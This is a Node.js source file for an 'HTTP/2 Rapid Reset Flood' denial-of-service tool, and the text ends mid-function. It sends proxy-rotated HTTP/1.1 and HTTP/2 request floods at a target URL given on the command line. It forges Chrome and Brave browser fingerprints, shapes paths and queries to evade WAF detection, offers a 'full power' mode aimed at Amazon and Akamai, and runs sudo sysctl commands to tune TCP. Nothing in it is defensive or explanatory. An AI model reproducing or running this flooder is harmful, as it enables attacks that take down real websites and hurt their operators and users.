// ═══════════════════════════════════════════════════════════════
//  REQUIRES
// ═══════════════════════════════════════════════════════════════
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const colors = require('colors');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');

// ═══════════════════════════════════════════════════════════════
//  CONSTANTS
// ═══════════════════════════════════════════════════════════════
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const browsers = ['Google Chrome', 'Brave'];

// Chrome versions realistic for mid-2026
const CHROME_VERSIONS = [131, 132, 133, 134, 135, 136];

// Realistic Accept-Language pools (weighted toward common configs)
const LANG_POOLS = [
    'en-US,en;q=0.9',
    'en-US,en;q=0.9',
    'en-US,en;q=0.9',
    'en-US,en;q=0.9,vi;q=0.8',
    'en-GB,en-US;q=0.9,en;q=0.8',
    'en-US,en;q=0.9,fr;q=0.8',
    'en-US,en;q=0.9,de;q=0.8',
    'en-US,en;q=0.9,ja;q=0.8',
    'en-US,en;q=0.9,es;q=0.8',
];

// ═══════════════════════════════════════════════════════════════
//  CLI ARGUMENTS
// ═══════════════════════════════════════════════════════════════
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];

const getArg = (flag) => {
    const i = process.argv.indexOf(flag);
    return i !== -1 && i + 1 < process.argv.length ? process.argv[i + 1] : undefined;
};

const query = getArg('--query');
const delay = getArg('--delay') ? parseInt(getArg('--delay')) : 0;
const cookieValue = getArg('--cookie');
const refererValue = getArg('--referer');
const postdata = getArg('--postdata');
const randrate = getArg('--randrate');
const customIP = getArg('--ip');
const maxConns = getArg('--limit') ? parseInt(getArg('--limit')) : 10000;

const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : 2;
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const isFull = process.argv.includes('--full');

// ═══════════════════════════════════════════════════════════════
//  HELP / VALIDATION
// ═══════════════════════════════════════════════════════════════
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    const opts = [
        ['--query 1/2/3', 'Random query (?v=cache, ?utm=, ?q=search)'],
        ['--cookie "k=v"', 'Custom cookie, supports %RAND%'],
        ['--full', 'Full power mode (Amazon, Akamai)'],
        ['--http 1/2/mix', 'Force HTTP protocol version'],
        ['--debug', 'Show status codes (reduces RPS)'],
        ['--delay 1-1000', 'Delay between requests (ms)'],
        ['--referer <url>', 'Set Referer, use "rand" for random domain'],
        ['--postdata "k=v"', 'Append query string to path (use with POST)'],
        ['--randrate', 'Random ratelimit 1-59 per cycle'],
        ['--ip <ip:port>', 'Force single proxy/IP (no rotation)'],
    ];
    console.error('\n' + '  HTTP/2 Rapid Reset Flood'.bold.red.underline);
    console.error('  Update: 07/08/2026\n'.gray);
    console.error('  Options:'.yellow.underline);
    for (const [flag, desc] of opts)
        console.error(`    ${flag.padEnd(22).green} ${desc.gray}`);
    console.error(`    ${'Usage:'.cyan} node rapid.js <GET/POST/HEAD/OPTIONS> <target> <time> <threads> <ratelimit> <proxy>`);
    process.exit(1);
}

if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
    console.error('Error request method only can GET/POST/HEAD/OPTIONS');
    process.exit(1);
}
if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('Error protocol can only https:// or http://');
    process.exit(1);
}
if (isNaN(time) || time <= 0 || time > 86400) {
    console.error('Error time can not high 86400')
    process.exit(1);
}
if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads can not high 256')
    process.exit(1);
}

// ═══════════════════════════════════════════════════════════════
//  STATE VARIABLES
// ═══════════════════════════════════════════════════════════════
const statusesQ = []
let statuses = {}
let reqCount = 0;
let custom_table = 65536;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;
let hcookie = '';

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const url = new URL(target);
let proxy = [...new Set(fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(p => p.trim() && p.includes(':')))];

if (proxy.length === 0) {
    console.error('Error: proxy file empty or no valid proxies (ip:port)');
    process.exit(1);
}

// ═══════════════════════════════════════════════════════════════
//  UTILITIES
// ═══════════════════════════════════════════════════════════════
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
        if (e.code === 'ERR_IPC_CHANNEL_CLOSED') return false;
        if (debugMode) console.log(e)
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => { return 1; })
    .on("SIGCHILD", () => { return 1; });

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters[Math.floor(Math.random() * characters.length)];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters[Math.floor(Math.random() * characters.length)];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const pickBrowser = () => browsers[Math.floor(Math.random() * browsers.length)];

// Weighted platform pool - Windows dominant but with macOS for realism
const PLATFORMS = [
    { ua: 'Windows NT 10.0; Win64; x64', ch: '"Windows"', weight: 70 },
    { ua: 'Macintosh; Intel Mac OS X 10_15_7', ch: '"macOS"', weight: 20 },
    { ua: 'X11; Linux x86_64', ch: '"Linux"', weight: 10 },
];

function pickPlatform() {
    const roll = Math.random() * 100;
    let cumulative = 0;
    for (const p of PLATFORMS) {
        cumulative += p.weight;
        if (roll < cumulative) return p;
    }
    return PLATFORMS[0];
}

// Normalize URI path to avoid suspicious patterns that trigger WAF
function sanitizePath(rawPath) {
    let p = rawPath || '/';
    // Decode common encoded traversals before normalizing
    p = p.replace(/%2e/gi, '.').replace(/%2f/gi, '/').replace(/%5c/gi, '/');
    // Collapse multiple slashes
    p = p.replace(/\/{2,}/g, '/');
    // Remove dot segments (/../ and /./)
    const segments = p.split('/');
    const resolved = [];
    for (const seg of segments) {
        if (seg === '..') { resolved.pop(); }
        else if (seg !== '.' && seg !== '') { resolved.push(seg); }
    }
    p = '/' + resolved.join('/');
    // Ensure trailing slash is preserved if original had one (and it's not just /)
    if (rawPath.endsWith('/') && p !== '/' && !p.endsWith('/')) p += '/';
    // Remove null bytes and other control chars
    p = p.replace(/[\x00-\x1f\x7f]/g, '');
    return p || '/';
}

function genBrand(browserVersion, wfwf) {
    const brands = {
        131: `"${wfwf}";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
        132: `"Not A(Brand";v="8", "Chromium";v="132", "${wfwf}";v="132"`,
        133: `"Not/A)Brand";v="8", "Chromium";v="133", "${wfwf}";v="133"`,
        134: `"Chromium";v="134", "Not:A-Brand";v="24", "${wfwf}";v="134"`,
        135: `"${wfwf}";v="135", "Not-A.Brand";v="8", "Chromium";v="135"`,
        136: `"Chromium";v="136", "Not)A;Brand";v="99", "${wfwf}";v="136"`,
    };
    return brands[browserVersion] || brands[136];
}

function handleQuery(query) {
    const basePath = sanitizePath(url.pathname);
    if (query === '1') {
        // Natural-looking cache-buster param (like a CMS or CDN would use)
        const ts = Date.now().toString(36);
        return basePath + '?v=' + ts;
    } else if (query === '2') {
        // UTM-style params that look like marketing links
        const sources = ['google', 'facebook', 'twitter', 'email', 'newsletter', 'direct'];
        const mediums = ['cpc', 'organic', 'social', 'referral', 'email'];
        return basePath + '?utm_source=' + sources[Math.floor(Math.random() * sources.length)] +
            '&utm_medium=' + mediums[Math.floor(Math.random() * mediums.length)];
    } else if (query === '3') {
        // Search-like query
        const words = ['best', 'how', 'what', 'top', 'new', 'buy', 'free', 'review'];
        const w1 = words[Math.floor(Math.random() * words.length)];
        const w2 = words[Math.floor(Math.random() * words.length)];
        return basePath + '?q=' + w1 + '+' + w2;
    } else {
        return basePath;
    }
}

// ═══════════════════════════════════════════════════════════════
//  COOKIE SETUP
// ═══════════════════════════════════════════════════════════════

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        // Generate realistic-looking cookie (analytics/session style)
        const cookieNames = ['_ga', '_gid', 'session_id', 'sid', '_fbp', 'visitor_id', 'ajs_anonymous_id'];
        const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
        const val = crypto.randomBytes(12).toString('hex');
        hcookie = hcookie ? `${hcookie}; ${name}=${val}` : `${name}=${val}`;
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

// ═══════════════════════════════════════════════════════════════
//  HTTP/2 FRAME ENCODING
// ═══════════════════════════════════════════════════════════════
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)
        if (payload.length + offset != length) {
            return null
        }
    }

    return { streamId, length, type, flags, payload }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

// ═══════════════════════════════════════════════════════════════
//  HEADER BUILDERS
// ═══════════════════════════════════════════════════════════════
function buildH1Headers() {
    const browserVersion = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)];
    const wfwf = pickBrowser();
    const platform = pickPlatform();
    const brandValue = genBrand(browserVersion, wfwf);
    const isBrave = wfwf === 'Brave';

    const isNavigation = reqmethod === 'GET' || reqmethod === 'HEAD';
    const isPost = reqmethod === 'POST';
    const isOptions = reqmethod === 'OPTIONS';

    const acceptHeaderValue = isOptions ? '*/*' : (isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7');

    const langValue = isBrave
        ? 'en-US,en;q=0.9'
        : LANG_POOLS[Math.floor(Math.random() * LANG_POOLS.length)];

    const userAgent = `Mozilla/5.0 (${platform.ua}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const currentRefererValue = refererValue === 'rand'
        ? 'https://www.' + ['google.com', 'facebook.com', 'youtube.com', 'twitter.com', 'reddit.com', 'linkedin.com', 'github.com', 'bing.com'][Math.floor(Math.random() * 8)]
        : refererValue;
    const reqPath = query ? handleQuery(query) : sanitizePath(url.pathname) + (postdata ? `?${postdata}` : "") + (url.search && !postdata ? url.search : "");

    const secFetchSite = currentRefererValue ? 'cross-site' : 'none';
    const secFetchMode = isOptions ? 'cors' : 'navigate';
    const secFetchDest = isOptions ? 'empty' : 'document';

    let headers = `${reqmethod} ${reqPath} HTTP/1.1\r\n` +
        `Host: ${url.hostname}\r\n` +
        'Connection: keep-alive\r\n';

    if (isPost) {
        headers += 'Content-Length: 0\r\n' +
            'Content-Type: application/x-www-form-urlencoded\r\n';
    }

    headers += `sec-ch-ua: ${brandValue}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        `sec-ch-ua-platform: ${platform.ch}\r\n`;

    if (!isOptions && !isPost) {
        headers += 'Upgrade-Insecure-Requests: 1\r\n';
    }

    headers += `User-Agent: ${userAgent}\r\n` +
        `Accept: ${acceptHeaderValue}\r\n`;

    if (isPost) {
        headers += `Origin: https://${url.hostname}\r\n`;
    }

    headers += `Sec-Fetch-Site: ${secFetchSite}\r\n` +
        `Sec-Fetch-Mode: ${secFetchMode}\r\n`;

    if (!isOptions && isNavigation) {
        headers += 'Sec-Fetch-User: ?1\r\n';
    }

    headers += `Sec-Fetch-Dest: ${secFetchDest}\r\n` +
        'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
        `Accept-Language: ${langValue}\r\n`;

    if (hcookie && !isOptions) {
        headers += `Cookie: ${hcookie}\r\n`;
    }
    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n`;
    }

    headers += '\r\n';
    return Buffer.from(headers, 'binary');
}

function buildH2Headers() {
    const browserVersion = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)];
    const wfwf = pickBrowser();
    const platform = pickPlatform();
    const brandValue = genBrand(browserVersion, wfwf);
    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

    const langValue = isBrave
        ? 'en-US,en;q=0.9'
        : LANG_POOLS[Math.floor(Math.random() * LANG_POOLS.length)];

    const userAgent = `Mozilla/5.0 (${platform.ua}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;

    const currentRefererValue = refererValue === 'rand'
        ? 'https://www.' + ['google.com', 'facebook.com', 'youtube.com', 'twitter.com', 'reddit.com', 'linkedin.com', 'github.com', 'bing.com'][Math.floor(Math.random() * 8)]
        : refererValue;

    const isNavigation = reqmethod === 'GET' || reqmethod === 'HEAD';
    const isPost = reqmethod === 'POST';
    const isOptions = reqmethod === 'OPTIONS';

    // sec-fetch-site logic: none = typed URL, cross-site = from another site
    const secFetchSite = currentRefererValue ? 'cross-site' : 'none';
    // sec-fetch-mode: navigate for GET/POST form, cors for OPTIONS preflight
    const secFetchMode = isOptions ? 'cors' : 'navigate';
    // sec-fetch-dest: document for page nav, empty for OPTIONS/preflight
    const secFetchDest = isOptions ? 'empty' : 'document';

    // Build clean path
    let reqPath;
    if (query) {
        reqPath = handleQuery(query);
    } else {
        reqPath = sanitizePath(url.pathname) + (postdata ? `?${postdata}` : "") + (url.search && !postdata ? url.search : "");
    }

    const pseudoHeaders = Object.entries({
        ":method": reqmethod,
        ":authority": url.hostname,
        ":scheme": "https",
        ":path": reqPath,
    });

    const legitHeaders = {
        ...(isPost && { "content-length": "0" }),
        ...(isPost && { "content-type": "application/x-www-form-urlencoded" }),
        "sec-ch-ua": brandValue,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": platform.ch,
        ...(isBrave && { "sec-gpc": "1" }),
        ...(!isOptions && !isPost && { "upgrade-insecure-requests": "1" }),
        "user-agent": userAgent,
        "accept": isOptions ? '*/*' : acceptHeaderValue,
        ...(isPost && { "origin": `https://${url.hostname}` }),
        "sec-fetch-site": secFetchSite,
        "sec-fetch-mode": secFetchMode,
        ...(!isOptions && isNavigation && { "sec-fetch-user": "?1" }),
        "sec-fetch-dest": secFetchDest,
        ...(currentRefererValue && { "referer": currentRefererValue }),
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": langValue,
        ...(isNavigation && { "priority": "u=0, i" }),
        ...(hcookie && !isOptions && { "cookie": hcookie }),
    };

    return pseudoHeaders.concat(Object.entries(legitHeaders).filter(a => a[1] != null));
}

// ═══════════════════════════════════════════════════════════════
//  REQUEST BUILDERS
// ═══════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════
//  ATTACK ENGINE
// ═══════════════════════════════════════════════════════════════
function go() {
    let proxyHost, proxyPort;

    if (customIP) {
        [proxyHost, proxyPort] = customIP.split(':');
    } else {
        [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    }

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        setImmediate(go)
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2', 'http/1.1'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2', 'http/1.1'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: [
                    'TLS_AES_128_GCM_SHA256',
                    'TLS_AES_256_GCM_SHA384',
                    'TLS_CHACHA20_POLY1305_SHA256',
                    'ECDHE-ECDSA-AES128-GCM-SHA256',
                    'ECDHE-RSA-AES128-GCM-SHA256',
                    'ECDHE-ECDSA-AES256-GCM-SHA384',
                    'ECDHE-RSA-AES256-GCM-SHA384',
                    'ECDHE-ECDSA-CHACHA20-POLY1305',
                    'ECDHE-RSA-CHACHA20-POLY1305',
                    'ECDHE-RSA-AES128-SHA',
                    'ECDHE-RSA-AES256-SHA',
                    'AES128-GCM-SHA256',
                    'AES256-GCM-SHA384',
                    'AES128-SHA',
                    'AES256-SHA',
                ].join(':'),
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
                ecdhCurve: 'X25519:P-256:P-384',
                secureOptions:
                    crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_COMPRESSION |
                    crypto.constants.SSL_OP_NO_RENEGOTIATION |
                    crypto.constants.SSL_OP_TLSEXT_PADDING,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                // ── HTTP/1.1 path ──
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWriteH1() {
                        reqCount++
                        tlsSocket.write(buildH1Headers(), (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    doWriteH1()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWriteH1()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                // ── HTTP/2 path ──
                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)
                let hpackDecoder = new HPACK()
                hpackDecoder.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_table],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_header]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                // SETTINGS ACK
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 1 && debugMode) {
                                try {
                                    const decoded = hpackDecoder.decode(frame.payload)
                                    const statusEntry = decoded.find(x => x[0] == ':status')
                                    if (statusEntry) {
                                        const status = statusEntry[1]
                                        if (!statuses[status])
                                            statuses[status] = 0
                                        statuses[status]++
                                    }
                                } catch (e) { }
                            }
                            if (frame.type == 8) {
                                // WINDOW_UPDATE from server - Chrome ignores these gracefully
                            }
                            if (frame.type == 7) {
                                // GOAWAY - close gracefully like Chrome (no RST_STREAM!)
                                if (debugMode) {
                                    if (!statuses["GOAWAY"])
                                        statuses["GOAWAY"] = 0
                                    statuses["GOAWAY"]++
                                }
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                            if (frame.type == 3) {
                                // RST_STREAM from server - acknowledge by not sending on that stream
                            }
                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWriteH2() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    const requests = []
                    let currentRatelimit = randrate !== undefined ? getRandomInt(1, 59) : process.argv[6];

                    for (let i = 0; i < (isFull ? currentRatelimit : 1); i++) {
                        const combinedHeaders = buildH2Headers();

                        const packed = Buffer.concat([
                            // PRIORITY: exclusive=1, dep=stream 0, weight=255 (Chrome default for navigations)
                            Buffer.from([0x80, 0x00, 0x00, 0x00, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);

                        // flags 0x25 = END_STREAM | END_HEADERS | PRIORITY
                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2
                    }

                    reqCount += requests.length
                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                doWriteH2()
                            }, isFull ? 1000 : 1000 / currentRatelimit)
                        }
                    })
                }

                doWriteH2()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { netSocket.destroy() }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        } else {
            netSocket.destroy();
            go()
        }
    })
}

// ═══════════════════════════════════════════════════════════════
//  TCP TUNING
// ═══════════════════════════════════════════════════════════════
function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

// ═══════════════════════════════════════════════════════════════
//  MONITOR PANEL
// ═══════════════════════════════════════════════════════════════
const W = 60;
const stripAnsi = (s) => s.replace(/\x1B\[[0-9;]*m/g, '');
const vlen = (s) => stripAnsi(s).length;
const padV = (s, len) => s + ' '.repeat(Math.max(0, len - vlen(s)));
const padVStart = (s, len) => ' '.repeat(Math.max(0, len - vlen(s))) + s;
const centerV = (s, len) => {
    const total = Math.max(0, len - vlen(s));
    const left = Math.floor(total / 2);
    return ' '.repeat(left) + s + ' '.repeat(total - left);
};
const fmt = (n) => Number(n).toLocaleString('en-US');

function renderPanel(stats) {
    const now = new Date();
    const elapsed = Math.floor((now - stats.startTime) / 1000);
    const remain = Math.max(0, time - elapsed);
    const mm = String(Math.floor(remain / 60)).padStart(2, '0');
    const ss = String(remain % 60).padStart(2, '0');
    const emm = String(Math.floor(elapsed / 60)).padStart(2, '0');
    const ess = String(elapsed % 60).padStart(2, '0');
    const proto = forceHttp === 1 ? 'HTTP/1.1' : forceHttp === 2 ? 'HTTP/2' : 'mix';

    const top = ('╔' + '═'.repeat(W) + '╗').red;
    const sep = ('╠' + '═'.repeat(W) + '╣').red;
    const thin = ('╟' + '─'.repeat(W) + '╢').red;
    const bot = ('╚' + '═'.repeat(W) + '╝').red;
    const B = '║'.red;
    const row = (content) => B + padV(content, W) + B;
    const field = (label, value, w) => padV('  ' + label.padEnd(11).gray + value, w);

    const onoff = (flag, color) => flag ? 'ON'[color].bold : 'OFF'.gray;

    // Progress bar (time)
    const pbLen = W - 12;
    const pbFill = time > 0 ? Math.min(pbLen, Math.round((elapsed / time) * pbLen)) : 0;
    const pbPct = time > 0 ? Math.min(100, Math.round((elapsed / time) * 100)) : 0;
    const pbar = '█'.repeat(pbFill).red + '░'.repeat(pbLen - pbFill).gray;

    const out = [];
    out.push(top);
    out.push(B + centerV('H T T P / 2   R A P I D   R E S E T'.bold.red, W) + B);
    out.push(B + centerV('L I V E   M O N I T O R'.gray, W) + B);
    out.push(sep);
    out.push(row(field('Target', stats.target.cyan, W)));
    out.push(row(field('Method', reqmethod.yellow.bold, W / 2) + field('Protocol', proto.green.bold, W / 2)));
    out.push(row(field('Workers', (String(stats.activeWorkers).green.bold + '/'.gray + String(threads).green), W / 2) + field('Proxies', String(stats.proxyCount).cyan, W / 2)));
    out.push(thin);
    out.push(row(field('Elapsed', `${emm}:${ess}`.cyan.bold, W / 2) + field('Remaining', `${mm}:${ss}`.yellow.bold, W / 2)));
    out.push(row('  ' + pbar + ' ' + `${pbPct}%`.gray));
    out.push(thin);
    out.push(row(field('RPS', fmt(stats.rps).green.bold, W / 2) + field('Total', fmt(stats.total).cyan.bold, W / 2)));
    out.push(thin);
    out.push(row('  ' + 'STATUS CODES'.white.bold));
    if (stats.sortedStatuses.length === 0) {
        out.push(row('   ' + (debugMode ? '(waiting for responses...)' : '(enable --debug to see codes)').gray));
    } else {
        const maxCount = stats.sortedStatuses[0][1] || 1;
        for (const [code, count] of stats.sortedStatuses.slice(0, 8)) {
            let colored;
            if (code === 'GOAWAY') colored = code.magenta;
            else if (code.startsWith('2')) colored = code.green;
            else if (code.startsWith('3')) colored = code.cyan;
